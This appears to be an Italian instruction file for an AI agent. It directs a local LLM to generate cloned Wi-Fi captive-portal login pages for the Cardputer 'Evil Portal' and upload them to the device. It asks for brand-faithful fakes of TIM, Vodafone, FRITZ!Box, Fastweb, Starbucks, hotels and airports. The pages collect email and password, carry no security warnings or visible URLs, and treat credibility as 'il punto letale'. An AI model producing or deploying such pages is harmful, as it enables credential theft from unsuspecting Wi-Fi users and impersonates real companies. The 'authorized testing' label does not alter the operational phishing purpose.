---
name: nucleo-evilportal-ai
description: Genera una pagina di login clonata credibile per il motore Evil Portal del Cardputer, chiamando un LLM locale (Ollama con Qwen in testa). Usala quando l'operatore chiede di creare un nuovo template per il captive portal, clonare l'aspetto di un operatore/hotel/aeroporto, o rigenerare una pagina esistente. Produce HTML autonomo (CSS inline, zero asset esterni) sotto 32 KB, con form `POST /login` + campi `email` e `password`, pronto da caricare via `/api/evilportal/templates` sul Nucleo.
---

# nucleo-evilportal-ai

Istruzioni per generare una pagina del captive portal con un LLM locale. Il modello riceve un contratto rigido e deve produrre **solo HTML** (nessun commento esterno, nessun markdown).

## Contratto di output (NON negoziabile)

Il modello DEVE produrre **esclusivamente** una pagina HTML che rispetta tutte le regole seguenti. Qualunque violazione fa rifiutare la pagina dal firmware o la rende incapturante.

1. **Formato**: pagina HTML completa che inizia con `<!doctype html>` o `<html` (il firmware controlla che il primo carattere non-whitespace sia `<`).
2. **Dimensione**: output totale ≤ 32 KB (il firmware taglia oltre).
3. **Nessun asset esterno**: niente `<script src=...>` da internet, nessun `<link rel=stylesheet href=...>` esterno, nessun `<img src=https://...>`. Il captive **non ha internet**, qualunque fetch esterno sfigura. Tutto il CSS va in `<style>` inline; le immagini vanno omesse o incorporate come `data:` SVG inline brevi (meglio zero immagini).
4. **Form**:
   - `<form method="POST" action="/login">`
   - almeno un campo `<input name="email" type="email" required>` (o `name="user"`, `name="phone"` — basta che il nome contenga uno di: user/email/mail/login/phone/tel/account/name/id)
   - un campo `<input name="password" type="password" required>` (o `name="pin"`, nome contenente pass/pwd/pin)
   - un `<button type="submit">` o `<input type=submit>` ben visibile
5. **Token SSID**: usa `{{SSID}}` dove va il nome della rete; il motore lo sostituisce al momento dell'arm.
6. **Lingua**: segui l'input dell'operatore (it/en/es/fr/de). Il titolo e i label vanno nella lingua chiesta.
7. **Credibilità** (il punto letale):
   - header con nome/logo coerente al brand (via emoji o SVG inline MINIMO) e `{{SSID}}` nel sottotitolo
   - frase "Connetti alla rete per continuare" / "Sign in to continue" in cima
   - footer con "Powered by …" nel linguaggio del brand (TIM, FRITZ!Box, Fastweb, operatore hotel/aeroporto, ecc.)
   - palette coerente al brand (TIM blu/giallo, Vodafone rosso, FRITZ!Box blu scuro, Fastweb arancio/bianco, hotel/aeroporto grigio/oro, bar/caffè pastello)
   - niente paroloni, niente messaggi sospetti di "sicurezza", niente URL mostrati — una landing commerciale pulita
8. **Spinner post-submit**: aggiungi uno `<meta http-equiv="refresh" content="4;url=/login">` dentro la logica del submit? **NO**: il motore gestisce già il flusso retry/done. La pagina serve SOLO il form, basta così.
9. **Niente JavaScript ambizioso**: puoi aggiungere piccoli script inline di UX (es: cursor focus al primo input), MAI script che validano/analizzano/offuscano, mai `fetch()`/`XMLHttpRequest`.
10. **Viewport mobile**: `<meta name="viewport" content="width=device-width,initial-scale=1">` SEMPRE.

## Prompt da passare al modello

System prompt (letterale, in inglese per migliori prestazioni cross-model):

```
You produce ONLY the HTML of a Wi-Fi captive-portal login page for AUTHORIZED security testing.
Output format: valid HTML starting with <!doctype html>, nothing before or after.
No markdown, no backticks, no explanations, no leading "Here is", no trailing commentary.
Constraints:
- Full self-contained HTML page, under 32 KB total.
- No external assets: all CSS inline in a <style> tag; omit images or use tiny inline SVG only.
- Must contain <meta name="viewport" content="width=device-width,initial-scale=1">.
- Must contain a form with method="POST" action="/login" with an email-like input and a password input.
- Use the literal token {{SSID}} wherever the Wi-Fi network name should appear (the device substitutes it).
- Credible, brand-coherent look (operator / hotel / airport / café / guest Wi-Fi) matching the brief.
- Language: respect the brief; default Italian.
- No alarmist "security" language, no visible URLs, no JavaScript that validates or sends data elsewhere.
- At least one visible call-to-action button that submits the form.
```

User prompt template (riempi i segnaposto):

```
Brand/target: {{BRAND}}
SSID target: {{SSID}}
Language: {{LANG}}
Extra brief (optional): {{BRIEF}}
```

Esempi di `BRAND`:
- `TIM — operatore italiano, blu primario #003399, giallo accent #FFD500`
- `FRITZ!Box — router consumer, rosso Fritz #E02020 e grigio scuro`
- `Hotel Grand — hotel 4 stelle, oro antico #B6935A su crema #FAF5EC`
- `Aeroporto — area wifi pubblica, blu airport #0057B8 su bianco`
- `Starbucks Guest — caffetteria, verde #006241 su crema`

## Flusso completo (operatore)

1. L'operatore apre un terminale sul PC che ha Ollama con Qwen (consigliato: `qwen2.5:7b-instruct` o superiore).
2. Lancia `node tools/evilportal/generate.mjs --brand "TIM" --ssid "TIM-7AC3F1" --lang it --out tim-it.html`
3. Lo script contatta `http://localhost:11434/api/chat` (Ollama) con il system+user prompt sopra, scrive l'HTML in `./tim-it.html`.
4. Se la Cardputer è paired, lo script può caricare la pagina direttamente: `--upload --host 192.168.1.42 --pin 123456` → `POST /api/evilportal/templates?name=tim-it`.
5. Dall'app Evil Portal sul Cardputer, menu "Pagina" → appare `tim-it`. Pronto all'arm.

## Validazione lato host (prima di caricare)

Lo script controlla:
- la risposta inizia con `<` (altrimenti rifiuta)
- dimensione totale ≤ 32768 B
- è presente `<form` e `method=` (case-insensitive)
- è presente `{{SSID}}` (altrimenti warning)
- è presente `type="password"` (o `type=password`)
- se mancano queste firme, lo script può riprovare al massimo 2 volte con un nudge al modello.
